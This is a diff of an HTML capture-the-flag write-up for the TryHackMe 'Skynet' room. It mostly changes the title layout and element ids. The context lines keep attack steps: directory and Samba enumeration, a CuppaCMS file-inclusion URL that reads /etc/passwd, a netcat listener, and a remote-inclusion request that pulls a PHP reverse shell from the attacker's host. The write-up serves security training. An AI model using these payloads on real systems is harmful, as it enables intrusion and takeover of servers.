@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sigh&#x2026;Hasta La Vista: THM: Skynet</title>
+<title>THM: Skynet</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
 <link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
@@ -14,7 +14,10 @@
  |
  <a accesskey="H" href="/index.html"> HOME </a>
 </div><div id="content" class="content">
-<h1 class="title">Sigh&#x2026;Hasta La Vista: THM: Skynet</h1>
+<h1 class="title">THM: Skynet
+<br>
+<span class="subtitle">Sigh&#x2026;Hasta La Vista</span>
+</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
@@ -123,7 +126,7 @@ produce any results to the random strings I tried.
 </p>
 
 
-<div id="org844b697" class="figure">
+<div id="org271fc07" class="figure">
 <p><img src="images/Reconnaissance/20231215_114140_screenshot.png" alt="20231215_114140_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Homepage</p>
@@ -139,14 +142,14 @@ did not lose any more time, before launching gobuster:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org7e7a889">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
+<pre class="src src-bash" id="org82da0d0">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span> -o gobuster.big
 </pre>
 </div>
 
 <p>
 That, in turn, gave us some directories to check:
 </p>
-<pre class="example" id="org32b6a73">
+<pre class="example" id="org42d906f">
 /.htaccess (Status: 403)
 /.htpasswd (Status: 403)
 /admin (Status: 301)
@@ -163,7 +166,7 @@ While most of these show up as forbidden, <b>squirrelmail</b> is promising:
 </p>
 
 
-<div id="orgf04416f" class="figure">
+<div id="orgf3bba35" class="figure">
 <p><img src="images/Reconnaissance/20231215_114714_screenshot.png" alt="20231215_114714_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>SquirrelMail Login page</p>
@@ -188,7 +191,7 @@ enumeration on hold for Samba might be the right move to make:
 </p>
 
 
-<div id="org5967f12" class="figure">
+<div id="org3c95598" class="figure">
 <p><img src="images/Reconnaissance/20231216_125505_screenshot.png" alt="20231216_125505_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Nmap samba info</p>
@@ -208,7 +211,7 @@ Smbclient does a pretty decent job:
 </div>
 
 
-<div id="orgdf65f89" class="figure">
+<div id="org97bef7c" class="figure">
 <p><img src="images/Reconnaissance/20231216_125934_screenshot.png" alt="20231216_125934_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Shares on target samba</p>
@@ -230,7 +233,7 @@ gain initial foothold or privilege escalation later on)</li>
 <li><a id="orga07b83e"></a><a href="#orga07b83e">Anonymous</a><br>
 <div class="outline-text-5" id="text-orga07b83e">
 <div class="org-src-container">
-<pre class="src src-bash" id="org3059d67">smbclient //$<span class="org-variable-name">IP</span>/anonymous -U guest
+<pre class="src src-bash" id="orgec976d0">smbclient //$<span class="org-variable-name">IP</span>/anonymous -U guest
 </pre>
 </div>
 
@@ -254,7 +257,7 @@ against the login prompt (or the samba share / ssh server maybe) with
 <li><a id="org7aa728a"></a><a href="#org7aa728a">Milesdyson</a><br>
 <div class="outline-text-5" id="text-org7aa728a">
 <div class="org-src-container">
-<pre class="src src-bash" id="orgec976d0">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U guest
+<pre class="src src-bash" id="org9d26bad">smbclient //$<span class="org-variable-name">IP</span>/milesdyson -U guest
 </pre>
 </div>
 
@@ -295,7 +298,7 @@ useful information in the user&rsquo;s email account:
 <h4 id="org6184dab"><a href="#org6184dab">Password rEsEt</a></h4>
 <div class="outline-text-4" id="text-org6184dab">
 
-<div id="org5f1625b" class="figure">
+<div id="org7e06412" class="figure">
 <p><img src="images/Reconnaissance/20231216_131629_screenshot.png" alt="20231216_131629_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>Lo and Behold</p>
@@ -312,12 +315,12 @@ structure suggests the usage of a binary to ASCII converter: The final
 text makes <b>absolutely</b> no sense:
 </p>
 
-<pre class="example" id="org456bf7f">
+<pre class="example" id="orga2aa0b7">
 balls have zero to me to me to me to me to me to me to me to me to
 </pre>
 
 
-<div id="orgb5d6505" class="figure">
+<div id="orgc3c58ec" class="figure">
 <p><img src="images/Reconnaissance/20231216_131754_screenshot.png" alt="20231216_131754_screenshot.png">
 </p>
 </div>
@@ -349,7 +352,7 @@ gO nOw?
 </p>
 
 
-<div id="org5306911" class="figure">
+<div id="org2270103" class="figure">
 <p><img src="images/Reconnaissance/20231216_132530_screenshot.png" alt="20231216_132530_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 6: </span>Important.txt</p>
@@ -369,7 +372,7 @@ about. Again, enumeration is due:
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org82da0d0">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>/45kra24zxs28v3yd -o gobuster.big
+<pre class="src src-bash" id="orgb3f6a4c">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>/45kra24zxs28v3yd -o gobuster.big
 </pre>
 </div>
 
@@ -378,7 +381,7 @@ Visiting <code>/administrator</code> we get to a login page of <b>CuppaCMS</b>:
 </p>
 
 
-<div id="org6303d4f" class="figure">
+<div id="org71276d8" class="figure">
 <p><img src="images/Reconnaissance/20231216_132854_screenshot.png" alt="20231216_132854_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 7: </span>Login page of Cuppa</p>
@@ -409,7 +412,7 @@ see that there is:
 <li>RFI potential (PHP injection) (a reverse shell might be nice as well)</li>
 </ol>
 
-<pre class="example" id="orgdc46218">
+<pre class="example" id="org4237a9a">
 http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 </pre>
 </div>
@@ -433,7 +436,7 @@ nc -lvnp 6969 <span class="org-comment-delimiter"># </span><span class="org-comm
 Then, manipulating the <code>urlConfig</code> parameter once again we forge a
 request:
 </p>
-<pre class="example" id="orgb6d36bf">
+<pre class="example" id="orgaa8f0d4">
 http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.95.44:8000/php-reverse-shell.php
 </pre>
 
@@ -485,7 +488,7 @@ shell file for us, or to another reverse shell. For the shake of
 simplicity, I will go the second route.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
 </p>
 
-<pre class="example" id="orgfa4fea3">
+<pre class="example" id="org21fd88a">
 tar cf /home/milesdyson/backups/backup.tgz *
 </pre>
 
